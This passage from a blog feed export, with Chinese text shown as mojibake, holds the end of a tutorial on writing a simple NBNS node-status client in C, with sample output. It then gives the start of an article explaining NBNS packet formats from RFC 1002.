    In the event of an error, errno is set to indicate the error.
    Datagram sockets in various domains permit zero-length datagrams.
    When such a datagram is received, the return value is 0.
</code></pre>
<p>æ¥æ”¶æˆåŠŸè¿”å›æ¥æ”¶åˆ°çš„å­—èŠ‚æ•°ï¼Œå¦åˆ™è¿”å›-1ã€‚å½“ç„¶å¦‚ä½•æ¥æ”¶å­—èŠ‚ä¸º0åˆ™è¿”å›0.</p>
<h3 id="æ¥æ”¶æ•°æ®"><a href="#æ¥æ”¶æ•°æ®" class="headerlink" title="æ¥æ”¶æ•°æ®"></a>æ¥æ”¶æ•°æ®</h3><pre><code class="c">void recv_nbns_response(int sock)
{
    struct timeval tv;
    struct sockaddr_in src_addr;
    socklen_t src_len = sizeof(src_addr);
    ssize_t recv_len = 0;
    char res_buf[BUFFER_SIZE];
    char src_ip[IP_SIZE] = {0};

    tv.tv_sec = 5;
    tv.tv_usec = 0;
    /* set timeout 5s for some not exist PC */
    if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &amp;tv, sizeof(tv)) &lt; 0)
        handle_error(&quot;setsockopt&quot;);
    recv_len = recvfrom(sock, (char *)res_buf, BUFFER_SIZE, 0,
        (struct sockaddr *)&amp;src_addr, &amp;src_len);
    if (recv_len &lt; 0)
        handle_error(&quot;recvfrom&quot;);
    else if (recv_len &lt; sizeof(struct nbns_response_header))
        return;

    inet_ntop(AF_INET, (struct in_addr *)&amp;src_addr.sin_addr,
        (char *)&amp;src_ip, IP_SIZE);
    printf(&quot;recv response from %s : %ld Bytes\n&quot;, src_ip, recv_len);
    show_nbns_response(res_buf);
}
</code></pre>
<p>è¯¥å‡½æ•°é€šè¿‡<code>recvfrom</code>æ¥æ”¶æ•°æ®å¹¶å­˜å…¥å­—ç¬¦æ•°ç»„<code>res_buf</code>ä¸­ï¼ŒåŒæ—¶å¯ä»¥ä¿å­˜å‘é€æ–¹çš„åœ°å€ä¿¡æ¯å¹¶é€šè¿‡<code>inet_ntop</code>è½¬æ¢ä¸ºç‚¹åˆ†åè¿›åˆ¶IPåœ°å€ã€‚æœ€åé€šè¿‡è°ƒç”¨å‡½æ•°<code>show_nbns_response</code>æ‰“å°è§£ææ•°æ®ã€‚</p>
<p>æ¥æ”¶è¿‡ç¨‹ä¸­ï¼Œè¦è€ƒè™‘åˆ°æ•°æ®æ¥æºçš„ä¸€æ–¹ä¸å­˜åœ¨çš„æƒ…å†µï¼Œä¹Ÿå°±æ˜¯æ°¸è¿œæ”¶ä¸åˆ°æ•°æ®çš„æƒ…å†µï¼Œæ¯”å¦‚è¯·æ±‚IPåœ°å€ä¸º<code>192.168.1.10</code>çš„è®¾å¤‡ï¼Œä½†æ­¤åˆ»è¯¥è®¾å¤‡å…³æœºäº†ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦è®¾ç½®è¶…æ—¶æ—¶é—´ï¼Œé€šè¿‡<code>setsockopt</code>å‡½æ•°å¯ä»¥é…ç½®socketç›¸å…³çš„å¯é€‰é¡¹ï¼Œå½“å‘ç”Ÿè¶…æ—¶æ—¶ï¼Œè¿›è¡Œé”™è¯¯å¤„ç†å¹¶é€€å‡ºã€‚</p>
<h3 id="æ‰“å°è¾“å‡º"><a href="#æ‰“å°è¾“å‡º" class="headerlink" title="æ‰“å°è¾“å‡º"></a>æ‰“å°è¾“å‡º</h3><p>æ¥æ”¶æ•°æ®åä¼šè°ƒç”¨<code>show_nbns_response</code>å‡½æ•°è¿›è¡Œæ‰“å°è¾“å‡ºã€‚</p>
<pre><code class="c">void show_nbns_response(char *buf)
{
    struct nbns_response_header *res;
    struct nbns_name *pname, *pend;
    char rname[18] = {0};
    char echar = &#39;\0&#39;;

    res = (struct nbns_response_header *)buf;
    decode_name(res-&gt;rname, rname);

    printf(
        &quot;Transaction: %d\n&quot; \
        &quot;Flags: 0x%04x\n&quot; \
        &quot;Questions: %d\n&quot; \
        &quot;Answers: %d\n&quot; \
        &quot;Authority: %d\n&quot; \
        &quot;Additional: %d\n&quot; \
        &quot;RR_Name: %s (%s)\n&quot; \
        &quot;RR_Type: %s\n&quot; \
        &quot;RR_Class: %s\n&quot; \
        &quot;TTL: %d\n&quot; \
        &quot;Data length: %d\n&quot; \
        &quot;\nNumber of names: %d\n&quot;,
        ntohs(res-&gt;header.tid),
        ntohs(res-&gt;header.flags),
        ntohs(res-&gt;header.question),
        ntohs(res-&gt;header.answer),
        ntohs(res-&gt;header.authority),
        ntohs(res-&gt;header.additional),
        res-&gt;rname + 1, rname,
        ntohs(res-&gt;rtype) == NBNS_TYPE_NBSTAT ? &quot;NBSTAT (33)&quot; : &quot;NB (32)&quot;,
        ntohs(res-&gt;rclass) == NBNS_CLASS_IN ? &quot;IN (1)&quot; : &quot;UNKNOWN&quot;,
        ntohl(res-&gt;ttl),
        ntohs(res-&gt;length),
        res-&gt;num_of_names);

    pname = (struct nbns_name *)&amp;buf[sizeof(struct nbns_response_header)];
    pend = pname + res-&gt;num_of_names;
    printf(&quot;---------------------------\n&quot;);
    for (; pname &lt; pend; pname++ ) {
        /* ignore the last byte of name*/
        echar = pname-&gt;name[15];
        pname-&gt;name[15] = &#39;\0&#39;;
        printf(&quot;Name: %s&lt;%02x&gt;\n&quot;, pname-&gt;name, echar);
        printf(&quot;Name flags: 0x%04x\n&quot;, ntohs(pname-&gt;flags));
        printf(&quot;---------------------------\n&quot;);
    }
}
</code></pre>
<p>ç”±äºä¸æ¸…æ¥šå‘é€æ–¹ç©¶ç«Ÿä¼šå‘é€å¤šå°‘ç»„åç§°ï¼Œæ‰€ä»¥å…ˆä»ç¼“å­˜æ•°ç»„ä¸­è¯»å–å¤´éƒ¨ä¿¡æ¯ï¼Œç„¶åæ ¹æ®å¤´éƒ¨ä¿¡æ¯æä¾›çš„num_of_namesç¡®å®šåç§°æ ¼å¼ï¼Œå†é€ä¸€æ‰“å°å‡ºæ¥ã€‚è¯»å–æ•°æ®çš„è¿‡ç¨‹å°±åƒæ˜¯æ”¶ä»¶æ–¹æ¥æ”¶åˆ°ä¿¡ä»¶ç„¶åè¿›è¡Œé˜…è¯»ä¸€æ ·ã€‚</p>
<p>æ³¨æ„ï¼Œè¿™é‡Œæœ‰ç”¨åˆ°<code>ntohs</code>, <code>ntohl</code>è¿›è¡Œå­—èŠ‚åºçš„è½¬æ¢ï¼ŒåŒæ—¶æœ‰ç”¨åˆ°decode_nameè¿›è¡Œåç§°çš„è§£ç ã€‚</p>
<h2 id="å¼‚å¸¸å¤„ç†"><a href="#å¼‚å¸¸å¤„ç†" class="headerlink" title="å¼‚å¸¸å¤„ç†"></a>å¼‚å¸¸å¤„ç†</h2><p>æœ€åç®€å•æè¿°ä¸‹å¼‚å¸¸å¤„ç†å‡½æ•°<code>handle_error</code>, å…¶å®å¾ˆç®€å•ï¼Œå°±æ˜¯åœ¨å‘ç”Ÿé”™è¯¯çš„æƒ…å†µä¸‹å…³é—­èµ„æºï¼Œæ‰“å°é”™è¯¯ä¿¡æ¯ï¼Œæœ€åé€€å‡ºç¨‹åºã€‚</p>
<pre><code class="c">int nbns_sock; /* global value */
static inline void handle_error(char *msg)
{
    if (nbns_sock &gt;= 0)
        close(nbns_sock);
    perror(msg);
    exit(EXIT_FAILURE);
}
</code></pre>
<h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><p>ç¨‹åºç¼–å†™å®Œæˆï¼Œä½¿ç”¨<code>gcc</code>ç¼–è¯‘å³å¯ï¼Œä¸‹é¢ç»™å‡ºæµ‹è¯•ç”¨ä¾‹â†“</p>
<pre><code class="bash">âœ nbnstat 192.168.1.1
Send nbns query to 192.168.1.1
recv response from 192.168.1.1 : 247 Bytes
Transaction: 1
Flags: 0x8580
Questions: 0
Answers: 1
Authority: 0
Additional: 0
RR_Name: CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (*)
RR_Type: NBSTAT (33)
RR_Class: IN (1)
TTL: 0
Data length: 191

Number of names: 8
---------------------------
Name: SMBSHARE       &lt;00&gt;
Name flags: 0x4400
---------------------------
Name: SMBSHARE       &lt;03&gt;
Name flags: 0x4400
---------------------------
Name: SMBSHARE       &lt;1f&gt;
Name flags: 0x4400
---------------------------
Name: SMBSHARE       &lt;20&gt;
Name flags: 0x4400
---------------------------
Name: __MSBROWSE__&lt;01&gt;
Name flags: 0xc400
---------------------------
Name: WORKGROUP      &lt;00&gt;
Name flags: 0xc400
---------------------------
Name: WORKGROUP      &lt;1d&gt;
Name flags: 0x4400
---------------------------
Name: WORKGROUP      &lt;1e&gt;
Name flags: 0xc400
---------------------------
</code></pre>
<p>é™¤äº†flagsä¿¡æ¯ä½¿ç”¨åŸæœ‰çš„16è¿›åˆ¶è¡¨ç¤ºå¤–ï¼Œå…¶ä½™æ•°æ®å‡ä»¥æ•´å‹æˆ–å­—ç¬¦ä¸²å½¢å¼æ˜¾ç¤ºã€‚</p>
<p>ä¸Šé¢æ˜¯æ­£å¸¸æƒ…å†µï¼Œä¸‹é¢ç»™å‡ºä¸¤ä¸ªå¼‚å¸¸æƒ…å†µçš„ä¾‹å­ã€‚</p>
<pre><code class="bash">âœ  nbnstat 192.168.1.10
Send nbns query to 192.168.1.10
recvfrom: Resource temporarily unavailable
âœ  nbnstat 192.16
Not in presentation format
</code></pre>
<ol>
<li>ç¬¬1ä¸ªæ˜¯æŒ‡å®šIPè®¾å¤‡ä¸å­˜åœ¨ï¼Œç„¶åäº§ç”Ÿè¶…æ—¶é”™è¯¯ï¼›</li>
<li>ç¬¬2ä¸ªæ˜¯æŒ‡å®šIPæ ¼å¼ä¸æ­£ç¡®ï¼Œæç¤ºæ ¼å¼é”™è¯¯ã€‚</li>
</ol>
<h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬æ–‡ä»‹ç»äº†ä¸€ä¸ªç®€å•<strong>NBNSå®¢æˆ·ç«¯</strong>çš„å…·ä½“å®ç°ï¼Œè¯¥å®¢æˆ·ç«¯ç”¨äºå‘æŒ‡å®šIPè®¾å¤‡å‘é€NBNS NODE STATUS QUERYï¼Œå¹¶å¯¹è¯·æ±‚ç»“æœäºˆä»¥åˆ†æå’Œæ‰“å°ã€‚æ¶‰åŠåˆ°çš„Socket APIå‡½æ•°æœ‰socket, bind, sendto, recvfrom, htons, htonl, ntohs, ntohl, inet_pton, setsockoptç­‰ã€‚</p>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ç½‘ç»œåè®®è¯¦è§£1 - NBNS]]></title>
      <url>https://www.litreily.top/2020/02/28/nbns/</url>
      <content type="html"><![CDATA[<h2 id="NetBIOS-ç®€ä»‹"><a href="#NetBIOS-ç®€ä»‹" class="headerlink" title="NetBIOS ç®€ä»‹"></a>NetBIOS ç®€ä»‹</h2><p><strong>NetBIOS</strong>ï¼ŒNetwork Basic Input/Output Systemçš„ç¼©å†™ï¼Œä¸€èˆ¬æŒ‡ç”¨äº<strong>å±€åŸŸç½‘</strong>é€šä¿¡çš„ä¸€å¥—APIï¼Œç›¸å…³RFCæ–‡æ¡£åŒ…æ‹¬ <a href="https://tools.ietf.org/html/rfc1001" target="_blank" rel="noopener">RFC 1001</a>, <a href="https://tools.ietf.org/html/rfc1002" target="_blank" rel="noopener">RFC 1002</a>. RFC 1001ä¸»è¦å¯¹NetBIOSåŠç›¸å…³åè®®å’ŒæœåŠ¡è¿›è¡Œè§£é‡Šè¯´æ˜ï¼ŒRFC 1002ç»™å‡ºäº†ç›¸å…³åè®®å’ŒæœåŠ¡çš„æ•°æ®ç»„åŒ…æ ¼å¼ã€‚</p>
<p>NetBIOSæä¾›ä¸‰ç§è½¯ä»¶æœåŠ¡ï¼š</p>
<table>
<thead>
<tr>
<th>Service Name</th>
<th>Port</th>
<th>Protocol</th>
<th>Short Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>NetBIOS Name service</td>
<td>137</td>
<td>UDP/TCP</td>
<td>NBNS</td>
</tr>
<tr>
<td>NetBIOS Datagram</td>
<td>138</td>
<td>UDP</td>
<td>NBND</td>
</tr>
<tr>
<td>NetBIOS Session service</td>
<td>139</td>
<td>TCP</td>
<td>NBSS</td>
</tr>
</tbody>
</table>
<p>æœ¬æ–‡ä¸»è¦æè¿°æœ€å¸¸è§çš„<code>NBNS</code>.</p>
<a id="more"></a>
<h2 id="NBNS-ç®€ä»‹"><a href="#NBNS-ç®€ä»‹" class="headerlink" title="NBNS ç®€ä»‹"></a>NBNS ç®€ä»‹</h2><p><strong>NBNS</strong>æ˜¯NetBIOS name serviceçš„ç¼©å†™ï¼Œæ˜¯NetBIOSçš„å‘½åæœåŠ¡ï¼Œç”¨äºå°†NetBIOSåç§°æ˜ å°„åˆ°IPåœ°å€ä¸Šï¼Œæ˜¯NetBIOS-over-TCP(NBT)åè®®æ—çš„ä¸€ä»½å­ã€‚NBNSæ˜¯åŠ¨æ€DNSçš„ä¸€ç§ï¼ŒMicrosoftçš„NBNSå®ç°ç§°ä¸º<code>WINS</code>ã€‚è·¯ç”±å™¨å¯ä»¥é€šè¿‡å‘é€NBNSçŠ¶æ€è¯·æ±‚ä»¥è·å–è®¾å¤‡åï¼Œwindows PC æ¥æ”¶åˆ°åé€šè¿‡WINSæˆ–å°†æœ¬åœ°ç¼“å­˜å‘é€å‘½åä¿¡æ¯ç»™è·¯ç”±å™¨ã€‚</p>
<h2 id="NBNS-æ•°æ®æŠ¥æ ¼å¼"><a href="#NBNS-æ•°æ®æŠ¥æ ¼å¼" class="headerlink" title="NBNS æ•°æ®æŠ¥æ ¼å¼"></a>NBNS æ•°æ®æŠ¥æ ¼å¼</h2><p>NBNSçš„æ•°æ®æŠ¥æ–‡æ ¼å¼åœ¨RFC 1002 Ch4.2ä¸­å®šä¹‰ï¼ŒåŒ…å«ä»¥ä¸‹ä¿¡æ¯</p>
<pre><code class="md">&gt; 4.2.1 GENERAL FORMAT OF NAME SERVICE PACKETS
&gt;   4.2.1.1 HEADER
&gt;   4.2.1.2 QUESTION SECTION
&gt;   4.2.1.3 RESOURCE RECORD
&gt; 4.2.2 NAME REGISTRATION REQUEST
  4.2.3 NAME OVERWRITE REQUEST &amp; DEMAND
  4.2.4 NAME REFRESH REQUEST
&gt; 4.2.5 POSITIVE NAME REGISTRATION RESPONSE
  4.2.6 NEGATIVE NAME REGISTRATION RESPONSE
  4.2.7 END-NODE CHALLENGE REGISTRATION RESPONSE
  4.2.8 NAME CONFLICT DEMAND
  4.2.9 NAME RELEASE REQUEST &amp; DEMAND
  4.2.10 POSITIVE NAME RELEASE RESPONSE
  4.2.11 NEGATIVE NAME RELEASE RESPONSE
  4.2.12 NAME QUERY REQUEST
  4.2.13 POSITIVE NAME QUERY RESPONSE
  4.2.14 NEGATIVE NAME QUERY RESPONSE
  4.2.15 REDIRECT NAME QUERY RESPONSE
  4.2.16 WAIT FOR ACKNOWLEDGEMENT (WACK) RESPONSE
&gt; 4.2.17 NODE STATUS REQUEST
&gt; 4.2.18 NODE STATUS RESPONSE
</code></pre>
<p>æœ¬æ–‡ä¸»è¦ä»‹ç»åˆ—è¡¨ä¸­<code>&gt;</code>å¼€å¤´çš„éƒ¨åˆ†ã€‚</p>
<h3 id="GENERL-HEADER"><a href="#GENERL-HEADER" class="headerlink" title="GENERL HEADER"></a>GENERL HEADER</h3><p>NetBIOSæ•°æ®åŒ…çš„é€šç”¨æ ¼å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
+ ------                                                ------- +
|                            HEADER                             |
+ ------                                                ------- +
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                       QUESTION ENTRIES                        /
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                   ANSWER RESOURCE RECORDS                     /
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                  AUTHORITY RESOURCE RECORDS                   /
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                  ADDITIONAL RESOURCE RECORDS                  /
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre>
<ul>
<li>HEADER: å¤´éƒ¨ä¿¡æ¯ï¼ŒåŒ…å«IDä¿¡æ¯ç­‰</li>
<li>QUESTION ENTRIES: è¯·æ±‚ä¿¡æ¯</li>
<li>ANSWER RESOURCE RECORDS: åº”ç­”ä¿¡æ¯</li>
<li>AUTHORITY RESOURCE RECORDS: æˆæƒä¿¡æ¯</li>
<li>ADDITIONAL RESOURCE RECORDS: é¢å¤–æ·»åŠ ä¿¡æ¯ï¼Œå¦‚æ³¨å†Œä¿¡æ¯ã€åˆ·æ–°ä¿¡æ¯</li>
</ul>
<h4 id="HEADER"><a href="#HEADER" class="headerlink" title="HEADER"></a>HEADER</h4><p>ä¸‹é¢å…ˆæ¥çœ‹<code>HEADER</code>ä¿¡æ¯ã€‚</p>
<pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           NAME_TRN_ID         | OPCODE  |   NM_FLAGS  | RCODE |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|             QDCOUNT           |            ANCOUNT            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|             NSCOUNT           |            ARCOUNT            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre>
<ul>
<li>NAME_TRN_ID: Transaction ID, å¯ä»¥ç§°ä¸ºäº¤æ˜“IDï¼Œå°±æ˜¯é’ˆå¯¹æœ¬æ¬¡è¯·æ±‚æˆ–åº”ç­”å¯¹åº”çš„ID</li>
<li>OPCODE: åŒ…çš„ç±»å‹ç ï¼Œåé¢è¯¦è¿°</li>
<li>NM_FLAGS: æœ¬æ¬¡æ“ä½œç›¸å…³çš„æ ‡å¿—ä½ï¼Œåé¢è¯¦è¿°</li>
<li>RCODE: result code or request, åœ¨åº”ç­”ä¿¡æ¯ä¸­è¢«å¡«å…¥ï¼Œå…·ä½“æ•°å€¼ä¾æƒ…å†µè€Œå®š</li>
<li>QDCOUNT: uint_16 è¯·æ±‚ä¿¡æ¯æ¡ä¾‹æ•°é‡</li>
<li>ANCOUNT: uint_16 åº”ç­”ä¿¡æ¯è®°å½•æ•°é‡</li>
<li>NSCOUNT: uint_16 æˆæƒèµ„æºè®°å½•æ•°é‡</li>
<li>ARCOUNT: uint_16 é¢å¤–èµ„æºè®°å½•æ•°é‡</li>
</ul>
<p>å…³äº<strong>OPCODE</strong>ï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š</p>
<pre><code class="yml">  0   1   2   3   4
+---+---+---+---+---+
| R |    OPCODE     |
+---+---+---+---+---+
</code></pre>
<ul>
<li>R: ä¸º0ä»£è¡¨è¯·æ±‚åŒ…ï¼Œä¸º1ä»£è¡¨åº”ç­”åŒ…</li>
<li>1-4bitçš„å€¼æ ‡å¿—ä¸åŒçš„æ“ä½œï¼š<ul>
<li>0 = query</li>
<li>5 = registration</li>
<li>6 = release</li>
<li>7 = WACK</li>
<li>8 = refresh</li>
</ul>
</li>
</ul>
<p>å…³äº<strong>NM_FLAGS</strong>, å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š</p>
<pre><code class="yml">  0   1   2   3   4   5   6
+---+---+---+---+---+---+---+
|AA |TC |RD |RA | 0 | 0 | B |
+---+---+---+---+---+---+---+
</code></pre>
<ul>
<li>AA - Authoritative Answer flag, å½“OPCODEä¸­çš„Rä¸º0æ—¶å¿…é¡»ä¸º0ï¼Œåœ¨å“åº”æŠ¥æ–‡ä¸­æ€»æ˜¯è¢«è®¾ä¸º1</li>
<li>TC - æˆªæ–­æ ‡å¿—ï¼Œå½“æ•°æ®æŠ¥é•¿åº¦è¶…è¿‡576å­—èŠ‚åï¼Œéœ€è¦æˆªæ–­</li>
<li>RD - ä»…ç”¨äºè¯·æ±‚åŒ…ï¼Œåº”ç­”åŒ…ä¼šå¤åˆ¶è¯¥å€¼ï¼›è¯¥å€¼ä¸º1ä»£è¡¨NBNSä¼šè¿­ä»£è¯·æ±‚ã€æ³¨å†Œå’Œé‡Šæ”¾</li>
<li>RA - ä¸º1ä»£è¡¨å¯ä»¥é€’å½’è¯·æ±‚ã€æ³¨å†Œå’Œé‡Šæ”¾ï¼Œä¸º0åˆ™å¿…é¡»è¿­ä»£è¯·æ±‚</li>
<li>B - ä¸º1ä»£è¡¨å¹¿æ’­åŒ…æˆ–å¤šæ’­åŒ…ï¼Œä¸º0ä»£è¡¨å•æ’­åŒ…</li>
</ul>
<p><code>RA</code>ä¸<code>RD</code>çš„åŸæ–‡è§£é‡Šå¦‚ä¸‹ï¼š</p>
<blockquote>
<p><strong><code>RA</code></strong> 3 Recursion Available Flag.<br>Only valid in responses from a NetBIOS Name Server -- must be zero in all other responses.<br>If one (1) then the NBNS supports recursive query, registration, and release.<br>If zero (0) then the end-node must iterate for query and challenge for registration.</p>
<p><strong><code>RD</code></strong> 6 Recursion Desired Flag.<br>May only be set on a request to a NetBIOS Name Server.<br>The NBNS will copy its state into the response packet.<br>If one (1) the NBNS will iterate on the query, registration, or release.</p>
</blockquote>
<p>å¤§è‡´æ„æ€æ˜¯ï¼Œå¯¹äºè¯·æ±‚ã€æ³¨å†Œå’Œé‡Šæ”¾ï¼ŒåŒ…å«é€’å½’å‘é€å’Œè¿­ä»£å‘é€ä¸¤ç§æ–¹å¼ã€‚<code>RA</code>ä¸º1è¯´æ˜æ”¯æŒé€’å½’ï¼Œä¸º0è¯´æ˜åªèƒ½è¿­ä»£ï¼Œè¡¨å¾çš„æ˜¯ä¸€ç§èƒ½åŠ›ï¼›<code>RD</code>åˆ™æ˜¯è¯´æ˜å…·ä½“ä»¥ä»€ä¹ˆæ–¹å¼å‘é€ï¼Œå¦‚æœä¸º1åˆ™ä»£è¡¨è¿­ä»£ï¼Œè¡¨å¾çš„æ˜¯ä¸€ä¸ªå…·ä½“åŠ¨ä½œï¼Œè¿™ä¸ªå€¼åœ¨å“åº”åŒ…ä¸­ä¼šä»è¯·æ±‚åŒ…ä¸­å¤åˆ¶å¾—åˆ°ã€‚</p>
<h4 id="QUESTION-SECTION"><a href="#QUESTION-SECTION" class="headerlink" title="QUESTION SECTION"></a>QUESTION SECTION</h4><p>NBNSçš„è¯·æ±‚æ•°æ®æ®µæ ¼å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                          QUESTION_NAME                        /
/                                                               /
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         QUESTION_TYPE         |          QUESTION_CLASS       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre>
<ul>
<li>QUESTION_NAME: è¢«å‹ç¼©çš„NetBIOSï¼Œç¼–ç æ ¼å¼å¦‚ <a href="#NetBIOS-å‘½åç¼–ç ">NetBIOS-å‘½åç¼–ç </a></li>
<li>QUESTION_TYPE: è¯·æ±‚ç±»å‹<ul>
<li>0x0020 NB: NetBIOS é€šç”¨åç§°æœåŠ¡èµ„æºè®°å½•</li>
<li>0x0021 NBSTAT: <a href="#NODE-STATUS-REQUEST">NetBIOS NODE STATUS</a> èµ„æºè®°å½•</li>
</ul>
</li>
<li>QUESTION_CLASS: è¯·æ±‚ç±»åˆ«<ul>
<li>0x0001 Internet class</li>
</ul>
</li>
</ul>
<h4 id="RESOURCE-RECORD"><a href="#RESOURCE-RECORD" class="headerlink" title="RESOURCE RECORD"></a>RESOURCE RECORD</h4><p>NBNSçš„èµ„æºæ•°æ®æ®µå¯ä»¥å­˜åœ¨äºè¯·æ±‚æŠ¥æ–‡å’Œåº”ç­”æŠ¥æ–‡ä¸­ï¼Œæ•°æ®æ ¼å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                            RR_NAME                            /
/                                                               /
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|            RR_TYPE            |            RR_CLASS           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                              TTL                              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|            RDLENGTH           |                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+                               |
/                                                               /
/                             RDATA                             /
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre>
<ul>
<li>RR_NAME: ä¸ä¸Šè¿°çš„<code>QUESTION_NAME</code>ä¸€è‡´</li>
<li>RR_TYPE: è®°å½•ç±»å‹<ul>
<li>0x0001 A: IPåœ°å€è®°å½•</li>
<li>0x0002 NS: Name Serverèµ„æºè®°å½•</li>
<li>0x000A NULL: ç©ºè®°å½•</li>
<li>0x0020 NB: NetBIOS é€šç”¨åç§°æœåŠ¡èµ„æºè®°å½•</li>
<li>0x0021 NBSTAT: <a href="#NODE-STATUS-REQUEST">NetBIOS NODE STATUS</a> èµ„æºè®°å½•</li>
</ul>
</li>
<li>RR_CLASS: è®°å½•ç±»åˆ«<ul>
<li>0x0001 Internet class</li>
</ul>
</li>
<li>RDLENGTH: uint_16 æŒ‡å®šRDATAæ•°æ®æ®µçš„æ•°æ®é•¿åº¦</li>
<li>TTL: æŸèµ„æºè®°å½•åç§°çš„ç”Ÿå­˜æ—¶é—´</li>
<li>RDATA: åŸºäº<code>RR_TYPE</code>å’Œ<code>RR_CLASS</code>çš„æ•°æ®ä¿¡æ¯ï¼ŒåŒ…å«å…·ä½“çš„NetBIOS name.</li>
</ul>
<p>é’ˆå¯¹RR_TYPEä¸ºNBçš„æƒ…å†µï¼ŒRDATAçš„<code>NB_FLAGS</code>éƒ¨åˆ†çš„æ•°æ®æ ¼å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="yml">                                          1   1   1   1   1   1
  0   1   2   3   4   5   6   7   8   9   0   1   2   3   4   5
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
| G |  ONT  |                RESERVED                           |
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
</code></pre>
<ul>
<li>G: ä¸º0ä»£è¡¨unique NetBIOS name, å³å”¯ä¸€åç§°ï¼›ä¸º1ä»£è¡¨group NetBIOS name, å³ç»„åç§°ã€‚</li>
<li>ONT: Owner Node Type<ul>
<li>00 = B node, å¹¿æ’­èŠ‚ç‚¹(Broadcast)</li>
<li>01 = P node, å•æ’­èŠ‚ç‚¹(Point to Point)</li>
<li>10 = M node, æ··åˆèŠ‚ç‚¹(Mixed)</li>
<li>11 = Reserved</li>
</ul>
</li>
<li>RESERVED</li>
</ul>
<p>ä»¥ä¸Šä¾¿æ˜¯HEADER, QUESTION SECTIONä»¥åŠRESOURCE RECORD 3ä¸ªéƒ¨åˆ†çš„ä¸»è¦å†…å®¹ï¼Œæ‰€æœ‰NBNSç›¸å…³çš„è¯·æ±‚åŒ…å’Œå“åº”åŒ…éƒ½ä¾å¾ªä»¥ä¸Šæ ¼å¼ï¼Œå…·ä½“çš„ä¿¡æ¯ç»†èŠ‚åˆ™ä¾æƒ…å†µè€Œå®šã€‚</p>
